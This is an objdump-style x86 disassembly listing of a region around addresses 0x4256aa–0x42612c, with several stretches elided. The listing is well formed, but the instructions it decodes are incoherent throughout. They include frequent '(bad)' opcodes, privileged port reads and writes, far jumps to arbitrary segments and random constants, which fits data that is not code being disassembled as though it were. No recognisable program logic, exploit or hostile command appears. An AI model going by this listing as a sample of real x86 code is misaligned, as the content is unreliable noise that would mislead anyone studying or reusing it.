  4256aa:	xor    eax,0x6628c1f5
  4256af:	add    WORD PTR [eax-0x46],sp
  4256b3:	out    dx,al
  4256b4:	lea    esp,[ecx+edi*1]
  4256b7:	fwait
  4256b8:	mov    BYTE PTR [ebx],al
  4256ba:	xchg   esp,eax
  4256bb:	fsubr  DWORD PTR [edi]
  4256bd:	mov    esp,0x5b595125
  4256c2:	mov    dl,dh
  4256c4:	lds    ecx,FWORD PTR [ecx-0x2b]
  4256c7:	add    DWORD PTR [edi+0x52663a55],0x2cb8d009
  4256d1:	inc    edi
  4256d2:	or     ebx,DWORD PTR [edi-0x4a62cd81]
  4256d8:	mov    dl,0xd4
  4256da:	fsub   QWORD PTR [eax+eiz*8+0x49731f39]
  4256e1:	out    dx,al
  4256e2:	jo     0x4256cc
  4256e4:	ret    0x82f7
  4256e7:	mov    ecx,0x1a3ef2ba
  4256ec:	fidiv  DWORD PTR [edx+0x73]
  4256ef:	test   BYTE PTR [ebp+0x40c30b4b],al
  4256f5:	xchg   ecx,eax
  4256f6:	push   0x49e1b3ed
  4256fb:	adc    al,0xa3
  4256fd:	test   eax,0xd90805d9
  425702:	sbb    bh,ch
  425704:	push   esp
  425705:	ins    BYTE PTR es:[edi],dx
  425706:	inc    ebp
  425707:	fld    QWORD PTR [ecx+0x75]
  42570a:	lods   eax,DWORD PTR ds:[esi]
  42570b:	sub    eax,0xfefdbf2e
  425710:	mov    ah,0xb8
  425712:	jmp    0x13a349c
  425717:	retf   
  425718:	out    0xc3,al
  42571a:	inc    ecx
  42571b:	clc    
  42571c:	push   es
  42571d:	daa    
  42571e:	repnz imul ebx,DWORD PTR es:[esi-0x6996d2fd],0x68ab99ea
  42572a:	hlt    
  42572b:	pop    edx
  42572c:	jo     0x4256d3
  42572e:	mov    WORD PTR [eax-0x56],cs
  425731:	fsubr  DWORD PTR [eax]
  425733:	sti    
  425734:	dec    ebp
  425735:	dec    ecx
  425736:	popf   
  425737:	js     0x42574c
  425739:	daa    
  42573a:	mov    edi,0xe6ae4dee
  42573f:	test   BYTE PTR ds:0x4b8526f,ah
  425745:	jae    0x42572c
  425747:	push   0xbe66b89d
  42574c:	inc    edx
  42574d:	lock dec ebx
  42574f:	inc    esp
  425750:	mov    dh,0xb0
  425752:	rcr    DWORD PTR [edx],0x55
  425755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425756:	sti    
  425757:	xor    eax,0x487b3857
  42575c:	dec    ebx
  42575d:	fisubr WORD PTR [ebx]
  42575f:	dec    ecx
  425760:	pop    edi
  425761:	fisubr DWORD PTR [esi-0x57]
  425764:	inc    esi
  425765:	sahf   
  425766:	ret    0x24b8
  425769:	mov    ebx,0x6dd4e14
	...
  4257d6:	(bad)  
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x2788bf74
  4257e5:	push   0x19267
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	jbe    0x4257f4
  4257f0:	aaa    
  4257f1:	rcr    ah,cl
  4257f3:	dec    ecx
  4257f4:	pop    esi
  4257f5:	das    
  4257f6:	loope  0x42585a
  4257f8:	mov    al,ds:0xc20a9ec0
  4257fd:	xchg   ebx,eax
  4257fe:	jmp    0xa48c72e6
  425803:	pushf  
  425804:	out    dx,al
  425805:	loop   0x425843
  425807:	mov    ch,0x23
  425809:	(bad)  
  42580b:	clc    
  42580c:	sbb    DWORD PTR [ebp+0x54c224e4],edx
  425812:	push   esp
  425813:	gs ins BYTE PTR es:[edi],dx
  425815:	xchg   edi,eax
  425816:	mov    ss,WORD PTR [esi*2+0xe320084]
  42581d:	popa   
  42581e:	mov    DWORD PTR [eax],eax
  425820:	inc    ebx
  425821:	lds    edx,FWORD PTR [edi]
  425823:	rcr    DWORD PTR [esi-0xe28acd4],cl
  425829:	jg     0x425808
  42582b:	sub    al,0x72
  42582d:	lock out 0x3c,al
  425830:	add    esp,0xe4b055a6
  425836:	pop    edi
  425837:	lahf   
  425838:	out    dx,al
  425839:	adc    eax,0xdf009eb5
  42583e:	je     0x425874
  425840:	push   cs
  425841:	inc    eax
  425842:	lock xchg esp,eax
  425844:	(bad)  
  425845:	ds mov ah,0x40
  425848:	retf   
  425849:	outs   dx,BYTE PTR ds:[esi]
  42584a:	retf   0x7c38
  42584d:	stos   BYTE PTR es:[edi],al
  42584e:	jl     0x425845
  425850:	mov    ecx,0x908c37a7
  425855:	or     BYTE PTR [ebx-0x5298973f],bh
  42585b:	not    BYTE PTR [esi-0x45]
  42585e:	mov    WORD PTR [esi-0x645347b],?
  425864:	xor    bh,ch
  425866:	push   edi
  425867:	and    dh,ah
  425869:	mov    cs:0x6b8f8b7f,al
  42586f:	fs fdivp st(4),st
  425872:	and    DWORD PTR [ecx-0x2d],edi
  425875:	and    eax,0xbfa79d3a
  42587a:	scas   al,BYTE PTR es:[edi]
  42587b:	stos   DWORD PTR es:[edi],eax
  42587c:	mov    eax,0xfdc9eb8f
  425881:	pop    esp
  425882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425883:	mov    ch,0x4b
  425885:	fiadd  WORD PTR [ebp-0x69]
  425888:	lea    ebx,[eax+ebp*1-0x69]
  42588c:	lea    edx,[eax-0x4cb5c4ea]
  425892:	jg     0x4258d3
  425894:	sbb    BYTE PTR [ecx-0x2b],0x88
  425898:	pop    es
  425899:	jp     0x425889
  42589b:	out    0x2d,eax
  42589d:	mov    edi,0x55cdc77a
  4258a2:	imul   edi,DWORD PTR [esi+0x4c95d23c],0xceb94761
  4258ac:	bound  esp,QWORD PTR [ebx-0x4b]
  4258af:	call   0x37d1:0xaf32ebbd
  4258b6:	mov    al,0x56
  4258b8:	mov    DWORD PTR [ebx],ecx
  4258ba:	ror    DWORD PTR [ebx+0x10],1
  4258bd:	xor    ah,ch
  4258bf:	fsub   QWORD PTR [edx+0x38]
  4258c2:	hlt    
  4258c3:	ins    DWORD PTR es:[edi],dx
  4258c4:	inc    esp
  4258c5:	(bad)  
  4258c6:	pop    cx
  4258c8:	pop    ecx
  4258c9:	cmp    BYTE PTR [esi],0x40
  4258cc:	sub    BYTE PTR [edx],dh
  4258ce:	mov    esi,0xa4d25a60
  4258d3:	jge    0x42593c
  4258d5:	push   ds
  4258d6:	setne  BYTE PTR [ebx+esi*8-0x15]
  4258db:	cmp    ah,dl
  4258dd:	xchg   edx,eax
  4258de:	and    DWORD PTR [edi+eax*4-0x4c],ebx
  4258e2:	scas   al,BYTE PTR es:[edi]
  4258e3:	push   0x6e1e4b62
  4258e8:	out    0xe3,al
  4258ea:	jae    0x425887
  4258ec:	into   
  4258ed:	aad    0x0
	...
  425953:	add    BYTE PTR [eax],al
  425955:	add    BYTE PTR [edx+edx*2-0x70],bl
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	std    
  425963:	ins    DWORD PTR es:[edi],dx
  425964:	fs pop edx
  425966:	addr16 xchg ebx,eax
  425968:	add    DWORD PTR [eax],eax
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	in     al,0x6d
  425970:	sti    
  425971:	inc    eax
  425972:	mov    dh,0x23
  425974:	(bad)  
  425975:	pop    ds
  425976:	repnz inc ecx
  425978:	adc    eax,0x366fbded
  42597d:	mov    ebx,ss
  42597f:	mov    eax,0x24ed05d3
  425984:	pop    eax
  425985:	cdq    
  425986:	std    
  425987:	sub    eax,0xa5860f15
  42598c:	call   0x479d833f
  425991:	fild   WORD PTR [edi]
  425993:	push   esi
  425994:	push   ecx
  425995:	sti    
  425996:	xor    ah,BYTE PTR [edx-0x6f]
  425999:	sub    al,0x69
  42599b:	cs pop edi
  42599d:	jns    0x4259a3
  42599f:	in     al,dx
  4259a0:	addr16 fcmovnb st,st(7)
  4259a3:	lock loopne 0x4259a7
  4259a6:	jns    0x425934
  4259a8:	daa    
  4259a9:	lahf   
  4259aa:	add    eax,0xf7eefc1d
  4259af:	xor    DWORD PTR [edi-0x44b8a96a],ebx
  4259b5:	addr16 mov ah,0x8e
  4259b8:	out    0xde,al
  4259ba:	ins    BYTE PTR es:[edi],dx
  4259bb:	ss or  eax,0x2be29d77
  4259c1:	sbb    DWORD PTR ds:0x9966e5a,edi
  4259c7:	ret    
  4259c8:	ficomp WORD PTR [edx-0x935eab2]
  4259ce:	ds push esp
  4259d0:	sbb    al,0x91
  4259d2:	rol    DWORD PTR [esi],cl
  4259d4:	jle    0x425a39
  4259d6:	in     eax,0x3c
  4259d8:	dec    esi
  4259d9:	ins    BYTE PTR es:[edi],dx
  4259da:	jg     0x425a47
  4259dc:	in     al,dx
  4259dd:	enter  0xb394,0xdc
  4259e1:	cld    
  4259e2:	push   cs
  4259e3:	je     0x42598e
  4259e5:	mov    eax,ds:0xa212576d
  4259ea:	and    DWORD PTR [ebp-0x29],0xc408fbb0
  4259f1:	cli    
  4259f2:	dec    edx
  4259f3:	adc    DWORD PTR [edi-0x2ee73803],0x3c
  4259fa:	cmp    BYTE PTR [ebp+esi*4-0x6f],al
  4259fe:	pusha  
  4259ff:	sub    ah,BYTE PTR [ebx+edx*4]
  425a02:	cmc    
  425a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a04:	jae    0x425a57
  425a06:	aaa    
  425a07:	ret    0x6f04
  425a0a:	mov    dl,0x2b
  425a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a0d:	push   ebx
  425a0e:	ja     0x425a63
  425a10:	sbb    ebp,DWORD PTR [edi-0x5b]
  425a13:	dec    ebx
  425a14:	imul   DWORD PTR [edi-0x14]
  425a17:	int3   
  425a18:	lea    edi,[eax+0x70]
  425a1b:	mov    ah,0x99
  425a1d:	mov    es,WORD PTR [edx+esi*4+0x6f]
  425a21:	or     eax,ecx
  425a23:	out    0xc0,al
  425a25:	dec    ebp
  425a26:	dec    esp
  425a27:	push   esp
  425a28:	clc    
  425a29:	jge    0x425a0c
  425a2b:	push   ebp
  425a2c:	fld    QWORD PTR [esi-0x26]
  425a2f:	cmc    
  425a30:	pop    esi
  425a31:	mov    ebp,0x73872c48
  425a36:	sar    DWORD PTR [eax+edx*1-0x61],0xc9
  425a3b:	sbb    dh,BYTE PTR [ebx+edx*1-0x72]
  425a3f:	dec    edx
  425a40:	sbb    esp,DWORD PTR [ecx]
  425a42:	(bad)  
  425a43:	ins    BYTE PTR es:[edi],dx
  425a44:	(bad)  
  425a45:	retf   
  425a46:	imul   esp,DWORD PTR [ebx+edi*8-0x39],0x11a86183
  425a4e:	adc    edi,esi
  425a50:	dec    ebx
  425a51:	scas   al,BYTE PTR es:[edi]
  425a52:	sbb    BYTE PTR [edx+0x65],0x68
  425a56:	mov    esp,0x5bba5198
  425a5b:	adc    bh,BYTE PTR [edx]
  425a5d:	and    DWORD PTR [edx],esi
  425a5f:	inc    esi
  425a60:	pop    ss
  425a61:	mov    DWORD PTR [ebx-0x18],eax
  425a64:	sub    ebp,ebx
  425a66:	in     eax,dx
  425a67:	stos   DWORD PTR es:[edi],eax
  425a68:	pop    es
  425a69:	ss sar bh,0xe
  425a6d:	pushf  
	...
  425ad6:	shl    DWORD PTR [ebx+0x4],0x67
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x27398c26]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	pop    es
  425aef:	and    DWORD PTR [esi-0x32],esp
  425af2:	test   eax,0x41efd868
  425af7:	in     al,dx
  425af8:	jae    0x425a8b
  425afa:	retf   0xe15e
  425afd:	add    ebx,edi
  425aff:	xor    bh,BYTE PTR [edi]
  425b01:	sar    DWORD PTR [edi-0x71],cl
  425b04:	inc    ecx
  425b05:	add    eax,0x8bb48354
  425b0a:	dec    edi
  425b0b:	mul    BYTE PTR [edi+eax*1]
  425b0e:	mov    ebp,0xba622b5a
  425b13:	push   ds
  425b14:	daa    
  425b15:	add    al,0x2b
  425b17:	jb     0x425b8f
  425b19:	mov    esi,0x8bbe7fc9
  425b1e:	(bad)  
  425b20:	jnp    0x425b08
  425b22:	dec    esi
  425b23:	adc    DWORD PTR [ecx+0x4a],esi
  425b26:	cli    
  425b27:	xchg   edx,eax
  425b28:	xchg   BYTE PTR [edx-0x263bf7d6],bl
  425b2e:	fstp   DWORD PTR [edx]
  425b30:	sub    dh,BYTE PTR [edi-0x1c60af6]
  425b36:	repnz stc 
  425b38:	clc    
  425b39:	test   eax,0x74ba8972
  425b3e:	rcl    edi,1
  425b40:	or     esi,esi
  425b42:	add    al,BYTE PTR [esi-0x10]
  425b45:	int    0x81
  425b47:	xchg   esi,eax
  425b48:	fprem  
  425b4a:	cmp    al,0x5e
  425b4c:	loop   0x425b0b
  425b4e:	sbb    DWORD PTR [esi],ebp
  425b50:	cli    
  425b51:	mov    ds:0x67d60619,eax
  425b56:	xlat   BYTE PTR ds:[ebx]
  425b57:	fstp   QWORD PTR [edx+0x5b0b3770]
  425b5d:	cld    
  425b5e:	or     ebp,DWORD PTR [ecx-0x55]
  425b61:	js     0x425ba4
  425b63:	inc    esp
  425b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b65:	add    cl,dh
  425b67:	stos   BYTE PTR es:[edi],al
  425b68:	fisub  DWORD PTR [ecx+0x1859f2dd]
  425b6e:	bound  ecx,QWORD PTR [edi]
  425b70:	add    eax,ebx
  425b72:	push   es
  425b73:	aaa    
  425b74:	xchg   esi,eax
  425b75:	neg    BYTE PTR [esi]
  425b77:	mov    al,0x6f
  425b79:	into   
  425b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b7b:	jno    0x425bf0
  425b7d:	call   0x464f20bf
  425b82:	mov    ds:0xcd8c2b83,eax
  425b87:	sbb    eax,0x70e3b630
  425b8c:	popa   
  425b8d:	pop    eax
  425b8e:	push   ds
  425b8f:	xor    al,0xee
  425b91:	dec    ecx
  425b92:	leave  
  425b93:	cwde   
  425b94:	jge    0x425c0d
  425b96:	adc    ch,BYTE PTR [ebx]
  425b98:	pop    ss
  425b99:	xor    eax,esp
  425b9b:	and    al,0xab
  425b9d:	bound  esp,QWORD PTR [esi]
  425b9f:	or     BYTE PTR [edx-0x793583a3],0x36
  425ba6:	or     DWORD PTR [ebx-0x65],edx
  425ba9:	daa    
  425baa:	addr16 je 0x425b5d
  425bad:	jbe    0x425b91
  425baf:	xlat   BYTE PTR ds:[ebx]
  425bb0:	jae    0x425c01
  425bb2:	add    eax,DWORD PTR [edi]
  425bb4:	pop    ecx
  425bb5:	sar    ch,1
  425bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bb8:	cmp    al,0xb3
  425bba:	push   eax
  425bbb:	popf   
  425bbc:	xlat   BYTE PTR ds:[ebx]
  425bbd:	outs   dx,BYTE PTR ds:[esi]
  425bbe:	mov    dl,0x1c
  425bc0:	(bad)
  425bc3:	aaa    
  425bc4:	outs   dx,BYTE PTR ds:[esi]
  425bc5:	test   al,0x53
  425bc7:	mov    ebx,0xa5ae1278
  425bcc:	pop    ss
  425bcd:	es das 
  425bcf:	imul   esp,DWORD PTR [edi+0x7a],0x21ccc674
  425bd6:	je     0x425bc6
  425bd8:	sbb    DWORD PTR [edx+0x1b73fab9],edx
  425bde:	and    eax,0x8affbd31
  425be3:	and    BYTE PTR [esi-0x4e7a206b],al
  425be9:	mov    bh,0x7d
  425beb:	into   
  425bec:	pop    es
  425bed:	sbb    eax,DWORD PTR [eax]
	...
  425c53:	add    BYTE PTR [eax],al
  425c55:	add    ah,al
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	inc    esi
  425c63:	test   ecx,ebp
  425c65:	xchg   edx,eax
  425c66:	addr16 xchg ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	out    0x26,al
  425c70:	dec    ebx
  425c71:	jl     0x425c05
  425c73:	pop    ss
  425c74:	imul   BYTE PTR [ebp+0xd3fc0b3]
  425c7a:	jp     0x425c4b
  425c7c:	add    edx,esp
  425c7e:	orps   xmm6,XMMWORD PTR [edi+0x4d0548ba]
  425c85:	ret    
  425c86:	(bad)  
  425c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c88:	pop    ebp
  425c89:	mov    DWORD PTR [esp+ebx*4+0x5eca312],ebx
  425c90:	push   0x74
  425c92:	rol    dh,cl
  425c94:	pop    edi
  425c95:	inc    esi
  425c96:	add    al,BYTE PTR [esi+0x57c8d0a3]
  425c9c:	inc    dx
  425c9e:	xchg   eax,edx
  425ca0:	xor    eax,0x818215c6
  425ca5:	pop    esi
  425ca6:	cmc    
  425ca7:	push   0xffffffd5
  425ca9:	dec    esp
  425caa:	mov    WORD PTR ds:0x3a2e3c5f,?
  425cb0:	mov    edi,0xd8505075
  425cb5:	push   es
  425cb6:	enter  0x5199,0xd6
  425cba:	fbld   TBYTE PTR [edx-0x530b8d79]
  425cc0:	ret    
  425cc1:	arpl   WORD PTR [esi-0x797acbb3],di
  425cc7:	push   0xffffffe9
  425cc9:	push   ebx
  425cca:	mov    al,0x12
  425ccc:	lock inc ecx
  425cce:	xchg   ebx,eax
  425ccf:	(bad)  
  425cd0:	fbstp  TBYTE PTR [edx*2+0x77a3d491]
  425cd7:	or     eax,0x5c8e59d3
  425cdc:	mov    ch,0xbd
  425cde:	mov    al,0xaf
  425ce0:	adc    cl,BYTE PTR [esi-0x6a]
  425ce3:	mov    al,ds:0xfc68542e
  425ce8:	lods   eax,DWORD PTR ds:[esi]
  425ce9:	ds (bad) 
  425ceb:	fstp   DWORD PTR [ecx]
  425ced:	aaa    
  425cee:	mov    eax,ds:0x93458495
  425cf3:	push   esi
  425cf5:	adc    dl,BYTE PTR [ecx+eax*2]
  425cf8:	push   esp
  425cf9:	push   ebp
  425cfa:	ins    DWORD PTR es:[edi],dx
  425cfb:	add    ebx,eax
  425cfd:	dec    ebp
  425cfe:	jne    0x425cd3
  425d00:	add    al,0xf0
  425d02:	ins    BYTE PTR es:[edi],dx
  425d03:	repz gs fwait
  425d06:	push   eax
  425d07:	push   ecx
  425d08:	jbe    0x425d7b
  425d0a:	cmp    BYTE PTR [edi+0x1f],ah
  425d0d:	shl    DWORD PTR [ebx-0x2b],0xdc
  425d11:	loopne 0x425d34
  425d13:	sub    ebx,DWORD PTR [eax+ebp*2-0x777d0a2b]
  425d1a:	or     al,0x20
  425d1c:	jns    0x425ce6
  425d1e:	xor    eax,0xe469ca90
  425d23:	inc    edi
  425d24:	mov    bl,0xe4
  425d26:	(bad)  
  425d27:	repnz xchg ch,al
  425d2a:	mov    dh,0x6f
  425d2c:	and    DWORD PTR [edx+ebp*4-0x6c],ebx
  425d30:	mov    esi,0x3c3b1683
  425d35:	in     al,dx
  425d36:	jmp    0x425d7a
  425d38:	dec    ecx
  425d39:	sub    eax,0x4705b97
  425d3e:	pop    ss
  425d3f:	pop    ss
  425d40:	aam    0x42
  425d42:	sbb    BYTE PTR [ebp+0x40],0x57
  425d46:	daa    
  425d47:	pop    esp
  425d48:	cdq    
  425d49:	push   es
  425d4a:	(bad)  
  425d4b:	fs leavew 
  425d4e:	push   edx
  425d4f:	test   ecx,ebx
  425d51:	(bad)  
  425d52:	pop    edx
  425d53:	push   eax
  425d54:	or     al,BYTE PTR [ecx-0x5cea04c0]
  425d5a:	pop    ds
  425d5b:	mov    esi,0xff1dc340
  425d60:	fild   DWORD PTR [ebx]
  425d62:	sbb    DWORD PTR [ecx+0x27],ebp
  425d65:	scas   al,BYTE PTR es:[edi]
  425d66:	retf   
  425d67:	adc    DWORD PTR [edi+ebp*1+0x13],ecx
  425d6b:	mov    esi,0x927d
	...
  425dd4:	add    BYTE PTR [eax],al
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x983b8272,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	cld    
  425def:	push   ds
  425df0:	shl    BYTE PTR [edx+0x53],1
  425df3:	rol    ah,0x73
  425df6:	push   esi
  425df7:	fs sub al,0x30
  425dfa:	dec    ebp
  425dfb:	pop    edi
  425dfc:	inc    eax
  425dfd:	retf   0x1e1e
  425e00:	xlat   BYTE PTR ds:[ebx]
  425e01:	lds    eax,FWORD PTR [ebx-0x73855447]
  425e07:	adc    edi,DWORD PTR [eax]
  425e09:	cmc    
  425e0a:	inc    ebp
  425e0b:	mov    al,0x5b
  425e0d:	push   edx
  425e0e:	cmp    esp,esi
  425e10:	fcomp  st(7)
  425e12:	xor    eax,DWORD PTR [esi]
  425e14:	sbb    DWORD PTR [esi],ebp
  425e16:	jb     0x425e42
  425e18:	push   esi
  425e19:	xchg   BYTE PTR [edi+ecx*4-0x13e02fb2],dh
  425e20:	gs in  eax,0x42
  425e23:	xor    DWORD PTR [ebx-0x5],edx
  425e26:	add    BYTE PTR [eax+edx*8],bh
  425e29:	sub    esp,DWORD PTR [ecx]
  425e2b:	call   0x75b51bb2
  425e30:	scas   eax,DWORD PTR es:[edi]
  425e31:	xlat   BYTE PTR ds:[ebx]
  425e32:	sar    BYTE PTR [edx-0x2a],0x7c
  425e36:	and    esi,ecx
  425e38:	clc    
  425e39:	test   DWORD PTR [edi-0x176d29ea],0x9b65d579
  425e43:	xchg   ebp,eax
  425e44:	cli    
  425e45:	(bad)  
  425e46:	bound  edx,QWORD PTR [ecx-0x65285f6]
  425e4c:	pop    ebp
  425e4d:	add    al,0xde
  425e4f:	push   0x9532f54
  425e54:	in     al,dx
  425e55:	fs aad 0xd4
  425e58:	fisttp DWORD PTR ds:0xe8049313
  425e5e:	pop    ebx
  425e5f:	dec    ebp
  425e60:	jle    0x425ec0
  425e62:	push   esi
  425e63:	add    DWORD PTR [eax],esp
  425e65:	cmp    BYTE PTR [ecx+0xd],ah
  425e68:	inc    edx
  425e69:	call   0xfa551f95
  425e6e:	inc    edx
  425e6f:	cmp    cl,bh
  425e71:	push   esp
  425e72:	mov    ecx,0x53480951
  425e77:	adc    BYTE PTR [eiz*4-0x331ca532],ah
  425e7e:	jg     0x425e7f
  425e80:	call   0x335ce325
  425e85:	repnz add cl,dl
  425e88:	test   DWORD PTR [edi+0x7d],eax
  425e8b:	sahf   
  425e8c:	jae    0x425e71
  425e8e:	push   cs
  425e8f:	jmp    0x2a4b:0xe614a195
  425e96:	sbb    eax,0x5de8f087
  425e9b:	sbb    DWORD PTR [edx],edi
  425e9d:	das    
  425e9e:	retf   
  425e9f:	sbb    al,0xcf
  425ea1:	das    
  425ea2:	mov    dl,0x39
  425ea4:	iret   
  425ea5:	add    BYTE PTR [edx-0x5c],0x7c
  425ea9:	adc    cl,BYTE PTR [eax+0x533b4434]
  425eaf:	mov    eax,ds:0x547b0d82
  425eb4:	popf   
  425eb5:	mov    edi,0xdcfc0cd1
  425eba:	aad    0x34
  425ebc:	ror    DWORD PTR [ecx-0x77],1
  425ebf:	fstp   DWORD PTR ds:0x2c3367ea
  425ec5:	(bad)
  425ec8:	jp     0x425ea4
  425eca:	ja     0x425e53
  425ecc:	cmc    
  425ecd:	sbb    ah,BYTE PTR [edx-0x243a3451]
  425ed3:	mov    ds:0xcdb18143,al
  425ed8:	xor    edi,esp
  425eda:	inc    eax
  425edb:	mov    dl,0x1c
  425edd:	mov    al,ds:0xf4156ef6
  425ee2:	xor    esi,edi
  425ee4:	mov    al,0xaa
  425ee6:	jb     0x425f0b
  425ee8:	rcl    BYTE PTR [esi+0x4435625a],cl
	...
  425f56:	(bad)  
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	jae    0x425f49
  425f64:	mov    DWORD PTR [edi],edi
  425f66:	addr16 xchg edi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	add    BYTE PTR [ecx],al
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	out    0x18,al
  425f70:	mov    ebp,es
  425f72:	mov    ebx,0x68d70e0f
  425f77:	retf   
  425f78:	pop    edi
  425f79:	(bad)  [edx]
  425f7b:	jmp    0x9be8b36
  425f80:	enter  0x9aaa,0x8e
  425f84:	icebp  
  425f85:	mov    bh,0x13
  425f87:	pop    edi
  425f88:	cli    
  425f89:	mov    al,BYTE PTR [eax-0x76]
  425f8c:	shl    DWORD PTR [ecx-0x1e],cl
  425f8f:	jecxz  0x425fd2
  425f91:	jmp    ebp
  425f93:	stos   DWORD PTR es:[edi],eax
  425f94:	jne    0x425fe6
  425f96:	xchg   esi,eax
  425f97:	pushf  
  425f98:	outs   dx,DWORD PTR ds:[esi]
  425f99:	call   0x7e91:0x772df6d6
  425fa0:	inc    ecx
  425fa1:	mov    DWORD PTR [eax],edx
  425fa3:	in     al,0x57
  425fa5:	enter  0xb79d,0x11
  425fa9:	(bad)  
  425fab:	scas   eax,DWORD PTR es:[di]
  425fad:	mov    ah,0x99
  425faf:	and    ecx,esp
  425fb1:	add    DWORD PTR [eax+ecx*1-0x9],edx
  425fb5:	(bad)  
  425fb6:	xor    ebp,ecx
  425fb8:	shr    cl,cl
  425fba:	cmp    ch,BYTE PTR [edx+0x5a4c7c1a]
  425fc0:	js     0x42602a
  425fc2:	jecxz  0x425ff8
  425fc4:	jne    0x425fc9
  425fc6:	fdivrp st(2),st
  425fc8:	enter  0xfae9,0x9e
  425fcc:	and    DWORD PTR [ebp-0x67],esi
  425fcf:	sbb    bh,ch
  425fd1:	lahf   
  425fd2:	inc    esp
  425fd3:	adc    eax,0x2e5d066c
  425fd8:	mov    edx,0xe1bb355c
  425fdd:	cmp    al,0xa0
  425fdf:	(bad)  
  425fe0:	mov    ds:0x4f8160f5,eax
  425fe5:	sub    BYTE PTR [edi+0x15],0x7c
  425fe9:	and    al,0x1a
  425feb:	mov    al,ds:0x6222f6a3
  425ff0:	or     eax,edi
  425ff2:	pop    esi
  425ff3:	push   edx
  425ff4:	jno    0x425fc7
  425ff6:	xchg   BYTE PTR [ecx],cl
  425ff8:	retf   
  425ff9:	repz fxch st(6)
  425ffc:	jg     0x425fb3
  425ffe:	or     al,BYTE PTR [edi]
  426000:	xchg   esi,eax
  426001:	jo     0x426058
  426003:	test   al,0xd4
  426005:	loop   0x425f87
  426007:	loope  0x425f9d
  426009:	mov    ebx,0xe719d480
  42600e:	xchg   BYTE PTR [ecx+0x17dc7c06],al
  426014:	cli    
  426015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426016:	push   es
  426017:	loopne 0x42600e
  426019:	or     ch,BYTE PTR [ebp+0x53e8662b]
  42601f:	mov    dl,0x16
  426021:	pop    esp
  426022:	mov    edx,0x8388c804
  426027:	cmp    ch,dl
  426029:	call   0xa345825f
  42602e:	div    BYTE PTR [edi]
  426030:	add    DWORD PTR [esi+eax*1-0x74],edi
  426034:	inc    edi
  426035:	stos   DWORD PTR es:[edi],eax
  426036:	mov    bl,0x90
  426038:	fnsave [eax+ecx*4]
  42603b:	mov    esp,0x786f23a2
  426040:	enter  0x611b,0xd2
  426044:	sub    DWORD PTR [esi+ecx*2],ecx
  426047:	and    al,0xce
  426049:	xchg   edi,eax
  42604a:	jmp    0x6d9f:0x73fe1f99
  426051:	mov    cl,0x15
  426053:	icebp  
  426054:	xor    ebp,DWORD PTR [esi-0x5a]
  426057:	pshufw mm5,mm0,0x58
  42605b:	inc    esp
  42605c:	push   0x7f19a21
  426061:	mov    cs,WORD PTR [edx]
  426063:	mov    esp,0x6c13ee40
  426068:	ja     0x425ff3
  42606a:	dec    eax
  42606b:	ret    0x2165
	...
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	shl    DWORD PTR [edx],1
  4260e4:	pop    edx
  4260e5:	(bad)  
  4260e6:	addr16 cwde 
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	sub    al,0x89
  4260f0:	test   eax,0x3b131621
  4260f5:	jecxz  0x426164
  4260f7:	pusha  
  4260f8:	dec    ebp
  4260f9:	mov    ebp,0xbe6a79ae
  4260fe:	repnz ror esp,cl
  426101:	xchg   esi,eax
  426102:	fucom  st(6)
  426104:	sti    
  426105:	test   BYTE PTR [esi],0xcf
  426108:	loopne 0x426159
  42610a:	mov    BYTE PTR ds:0x2b24084d,ah
  426110:	jne    0x42616a
  426112:	inc    edx
  426113:	add    DWORD PTR [esi],esi
  426115:	push   ss
  426116:	pop    edi
  426117:	in     al,0xe5
  426119:	les    esi,FWORD PTR [edx+0x268be30e]
  42611f:	scas   al,BYTE PTR es:[edi]
  426120:	lds    esp,FWORD PTR [edx+0x71]
  426123:	adc    BYTE PTR [ecx-0x40],al
  426126:	push   esi
  426127:	add    al,0x6c
  426129:	data16 jp 0x4260b4
  42612c:	enter  0xd429,0x4e
